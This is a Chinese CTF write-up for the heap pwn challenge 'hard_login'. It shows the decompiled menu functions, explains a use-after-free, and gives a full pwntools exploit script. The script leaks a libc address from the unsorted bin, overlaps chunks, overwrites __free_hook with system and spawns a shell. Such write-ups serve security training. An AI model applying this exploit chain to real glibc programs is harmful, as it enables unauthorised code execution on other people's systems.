
---
title: 2022川渝职业技能竞赛初赛--hard_login
categories: [CTF]
tags: [wp,pwn]

---
太久没有做堆题了，突然做一道感觉还挺有意思的(主要全都忘完了/(ㄒoㄒ)/~~)<!--more-->

## 题目考点

UAF

unsorted bin（glibc 2.31）

## 题目分析

题目是经典的堆题，给了2.31的libc：

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

分析代码，分析提供四个功能：

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 v3; // rbp
  int v5; // [rsp-14h] [rbp-14h]
  unsigned __int64 v6; // [rsp-10h] [rbp-10h]
  __int64 v7; // [rsp-8h] [rbp-8h]

  __asm { endbr64 }
  v7 = v3;
  v6 = __readfsqword(0x28u);
  init();
  while ( 1 )
  {
    menu();
    __isoc99_scanf("%d", &v5);
    if ( v5 == 5 )
      break;
    switch ( v5 )
    {
      case 1:
        add();
        break;
      case 2:
        show_info((__int64)&v7);
        break;
      case 3:
        find_password();
        break;
      case 4:
        delete((__int64)&v7);
        break;
    }
  }
```

1.添加功能（add）

```c
__int64 add()
{
  __int64 result; // rax
  int v1; // ebx
  __int64 v2; // rbx
  __int64 v3; // rbx
  __int64 v4; // rbx
  _BYTE v5[6]; // [rsp-26h] [rbp-26h]
  signed int size; // [rsp-24h] [rbp-24h]
  unsigned __int64 v7; // [rsp-20h] [rbp-20h]

  __asm { endbr64 }
  v7 = __readfsqword(0x28u);
  for ( id = 0; id <= 9 && chunk_state_check[4 * id]; ++id )
    ;
  if ( id == 10 )
  {
    puts("Full!");
    result = 0LL;
  }
  else
  {
    printf("Your ID:%d\n", (unsigned int)id);
    printf("Info size:");
    __isoc99_scanf("%d", &size);
    if ( size <= 0x7F || size > 0x500 )
    {
      puts("Error!");
      exit(-1);
    }
    chunk_state_check[4 * id] = size;
    v1 = id;
    *((_QWORD *)&chunk + 2 * v1) = malloc(size + 0x20);
    if ( !*((_QWORD *)&chunk + 2 * id) )
    {
      puts("Error!");
      exit(-1);
    }
    printf("Your name:", &size);
    v2 = *((_QWORD *)&chunk + 2 * id);
    *(_BYTE *)(v2 + read(0, *((void **)&chunk + 2 * id), 0xFuLL)) = 0;
    printf("Your code:");
    __isoc99_scanf("%hu", v5);
    *(_WORD *)(*((_QWORD *)&chunk + 2 * id) + 0x10LL) = *(_WORD *)v5;
    printf("Your password:", v5);
    v3 = *((_QWORD *)&chunk + 2 * id);
    *(_BYTE *)(v3 + read(0, (void *)(*((_QWORD *)&chunk + 2 * id) + 0x18LL), 7uLL) + 0x18) = 0;
    printf("Your info:");
    v4 = *((_QWORD *)&chunk + 2 * id);
    *(_BYTE *)(v4 + read(0, (void *)(*((_QWORD *)&chunk + 2 * id) + 0x20LL), size - 1) + 0x20) = 0;
    result = 0LL;
  }
  return result;
}
```

2.显示info内容功能（show_info）

```c
__int64 __usercall show_info@<rax>(__int64 a1@<rbp>)
{
  signed int v2; // [rsp-1Ch] [rbp-1Ch]
  __int64 v3; // [rsp-18h] [rbp-18h]
  unsigned __int64 v4; // [rsp-10h] [rbp-10h]
  __int64 v5; // [rsp-8h] [rbp-8h]

  __asm { endbr64 }
  v5 = a1;
  v4 = __readfsqword(0x28u);
  printf("Your ID:");
  __isoc99_scanf("%d", &v2);
  if ( v2 < 0 || v2 > 10 )
  {
    puts("Error!");
    exit(-1);
  }
  printf("Your password:", &v2);
  read(0, &v3, 8uLL);
  if ( strcmp((const char *)(*((_QWORD *)&chunk + 2 * v2) + 24LL), (const char *)&v3) )
  {
    puts("Password error!");
    exit(-1);
  }
  printf("Your info:", &v3);
  puts((const char *)(*((_QWORD *)&chunk + 2 * v2) + 0x20LL));
  return 0LL;
}
```



3.修改密码（find_password）

```c
__int64 find_password()
{
  __int64 v0; // rbx
  __int64 result; // rax
  _BYTE v2[7]; // [rsp-27h] [rbp-27h]
  _BYTE v3[6]; // [rsp-26h] [rbp-26h]
  signed int v4; // [rsp-24h] [rbp-24h]
  unsigned __int64 v5; // [rsp-20h] [rbp-20h]

  __asm { endbr64 }
  v5 = __readfsqword(0x28u);
  printf("Your ID:");
  __isoc99_scanf("%d", &v4);
  if ( v4 < 0 || v4 > 10 )
  {
    puts("Error!");
    exit(-1);
  }
  printf("Your code:", &v4);
  __isoc99_scanf("%hu", v3);
  if ( *(_WORD *)(*((_QWORD *)&chunk + 2 * v4) + 16LL) != *(_WORD *)v3 )
  {
    puts("Code error!");
    exit(-1);
  }
  printf("Your password:", v3);
  puts((const char *)(*((_QWORD *)&chunk + 2 * v4) + 24LL));
  puts("Do you want to change?(Y/N)");
  __isoc99_scanf(" %c", v2);
  getchar();
  if ( v2[0] != 'Y' && v2[0] != 'y' )
  {
    if ( v2[0] != 'N' && v2[0] != 'n' )
    {
      putchar(v2[0]);
      printf("What are you doing?", v2);
      exit(-1);
    }
    result = 0LL;
  }
  else
  {
    printf("Your new password:", v2);
    v0 = *((_QWORD *)&chunk + 2 * v4);
    *(_BYTE *)(v0 + read(0, (void *)(*((_QWORD *)&chunk + 2 * v4) + 24LL), 7uLL) + 24) = 0;
    result = 0LL;
  }
  return result;
}
```

4.释放堆块（delete）

```c
__int64 __usercall delete@<rax>(__int64 a1@<rbp>)
{
  signed int v2; // [rsp-1Ch] [rbp-1Ch]
  __int64 v3; // [rsp-18h] [rbp-18h]
  unsigned __int64 v4; // [rsp-10h] [rbp-10h]
  __int64 v5; // [rsp-8h] [rbp-8h]

  __asm { endbr64 }
  v5 = a1;
  v4 = __readfsqword(0x28u);
  printf("Your ID:");
  __isoc99_scanf("%d", &v2);
  if ( v2 < 0 || v2 > 10 || !chunk_state_check[4 * v2] )
  {
    puts("Error!");
    exit(-1);
  }
  printf("Your password:", &v2);
  read(0, &v3, 8uLL);
  if ( strcmp((const char *)(*((_QWORD *)&chunk + 2 * v2) + 24LL), (const char *)&v3) )
  {
    puts("Password error!");
    exit(-1);
  }
  printf("Done!", &v3);
  free(*((void **)&chunk + 2 * v2));
  chunk_state_check[4 * v2] = 0;
  return 0LL;
}
```

## 解题分析

在释放堆块（`free`）时，题目有个`if ( v2 < 0 || v2 > 10 || !chunk_state_check[4 * v2] )`来限制操作的chunk只能是未释放的。但是`find_password`和`show_info`并没有限制。同时，由于free功能里，清除的` chunk_state_check[4 * v2] = 0;`被不是存储的chunk指针而是chunk的大小。因此造成了UAF利用。

于是，我们可以利用申请两个unsorted bin chunk 释放让其合并，再制造错位放第二个chunk的残留指针刚好可以修改password同时，info泄露出libc_addr.同时，利用残留指针修改unsorted bin chunk 大小，制造出chunk重叠，从而修改free chunk fd从而修改free_hook为`system`地址。

## 具体步骤

1.申请chunk，制造出uaf。

```
add(129,'lex',800,'1'*6,'y'*128)#0
add(129,'lex',800,'1'*6,'y'*128)#1
add(0x400,'lexs',800,'1'*6,'x'*(0x400-1))#2
add(0x400,'',0,'1'*6,'x'*0x1)#3
add(0x88,'',800,'1'*6, 'x'*(0x88-1-7)+p64(0x410+0xb0)[:-1])#4
add(129,'',800,'1'*6, p64( 0x4f0) + p64(0xb0))#5
add(129,'',800,'1'*6, p64( 0x4f0) + p64(0xb0))#6
free(0,'1'*6)
free(1,'1'*6)

free(2,'1'*6)
free(3,'1'*6)
add(0x420,'',800,'1'*6,'x'*(0x400-1))#new_chunk_0
```

2.通过chunk_4的残留指针 ,修改0x420 chunk的密码。再通过show功能

```
edit(3,0,'x'*6)
p.recv()
show(3,'x'*6)
```

3.利用第一步就布局的chunk_5和chunk_6,来制造重叠。 

![image-20221002105017934](image-20221002105017934.png)



通过chunk_4的残留指针，修改new_chunk_0大小0x411为0x4f1.从而为一个0xb0合并成一个unsorted bin chunk。

```
edit(3,0,p64( 0x411+0xb0+0x30)[:-1])
```

![image-20221002104358061](image-20221002104358061.png)

![image-20221002104652016](image-20221002104652016.png)

4.然后释放unsorted chunk，而释放被包含的0xb0 chunk从而制造出堆重叠。修改0xb0 chunk的fd为`__free_hook`,修改`__free_hook`的值的`system`.从而get shell

```
free(4,'1'*6)

add(0x4c0-0x20,'',0,'1'*6,'y'*0x3e0+p64(0)+p64(0xb0)+p64(x.dump('__free_hook'))+p64(0))#3
add(0x88,'',800,'1'*6, 'x'*(0x8))#4
add(0x88,p64(x.dump('system')),800,'1'*6,p64(0)*3)#4
add(0x98,'/bin/sh\x00',800,'1'*6, 'x'*(0x8))#4
free(4,'1'*6)
```

## 完整exp

```python
#!/usr/bin/env python
# -*- encoding: utf-8 -*-

'''
@File    :   exp.py
@Time    :   2022/09/15 11:25:12
@Author  :   lexsd6
'''

from pwn import * 
from libcfind import *

local_mote=1
elf='./hard_login'
e=ELF(elf)
context.arch=e.arch
context.log_level = 'debug'
ip_port=['',]

debug=lambda gdb_cmd='': gdb.attach(p,gdb_cmd) if local_mote==1 else None

if local_mote==1 :
   p=process(elf)
else :
   p=remote(ip_port[0],ip_port[-1])

def add(size,name,code,password,info):
   p.sendline('1')
   p.recvuntil('Your ID:')
   print('id:'+p.recvline())
   p.recvuntil('Info size:')
   p.sendline(str(size))
   p.recvuntil('Your name:')
   p.sendline(name)
   p.recvuntil('Your code:')
   p.sendline(str(code))
   p.recvuntil('Your password:')
   p.sendline(str(password))
   p.recvuntil('Your info:')  
   p.sendline(str(info))

def show(id,password):
   p.sendline('2')
   p.recvuntil('Your ID:')
   p.sendline(str(id))
   p.recvuntil('Your password:')
   p.sendline(password)
  

def edit(id,code,pw):
   p.sendline('3')
   p.recvuntil('Your ID:')
   p.sendline(str(id))
   p.recvuntil('Your code:')
   p.sendline(str(code))
   print(p.recv())
   p.sendline('Y')
   p.recvuntil('Your new password:')
   p.sendline(pw)

def free(id,password):
   p.sendline('4')
   p.recvuntil('Your ID:')
   p.sendline(str(id))
   p.recvuntil('Your password:')
   p.sendline(password)


add(129,'lex',800,'1'*6,'y'*128)#0
add(129,'lex',800,'1'*6,'y'*128)#1
add(0x400,'lexs',800,'1'*6,'x'*(0x400-1))#2
add(0x400,'',0,'1'*6,'x'*0x1)#3
add(0x88,'',800,'1'*6, 'x'*(0x88-1-7)+p64(0x410+0xb0)[:-1])#4
add(129,'',800,'1'*6, p64( 0x4f0) + p64(0xb0))#5
add(129,'',800,'1'*6, p64( 0x4f0) + p64(0xb0))#6
free(0,'1'*6)
free(1,'1'*6)

free(2,'1'*6)
free(3,'1'*6)
add(0x420,'',800,'1'*6,'x'*(0x400-1))
#add(0x200,'lexs','1'*7,'','x'*(0x200-1))

edit(3,0,'x'*6)
p.recv()
show(3,'x'*6)
p.recvuntil('Your info:')
addr= u64(p.recvuntil('\x7f').ljust(8,'\x00'))
log.info('base_addr:'+hex(addr))
main_arena_addr=addr-96
log.info('main_arena_addr:'+hex(main_arena_addr))
__malloc_hook_addr=main_arena_addr-0x10
log.info('__malloc_hook_addr:'+hex(__malloc_hook_addr))
edit(3,0,p64( 0x411+0xb0+0x30)[:-1])
x=finder('__malloc_hook',__malloc_hook_addr,num=14)

free(4,'1'*6)

add(0x4c0-0x20,'',0,'1'*6,'y'*0x3e0+p64(0)+p64(0xb0)+p64(x.dump('__free_hook'))+p64(0))#3
add(0x88,'',800,'1'*6, 'x'*(0x8))#4
add(0x88,p64(x.dump('system')),800,'1'*6,p64(0)*3)#4
add(0x98,'/bin/sh\x00',800,'1'*6, 'x'*(0x8))#4
free(4,'1'*6)
debug()


p.interactive()

```

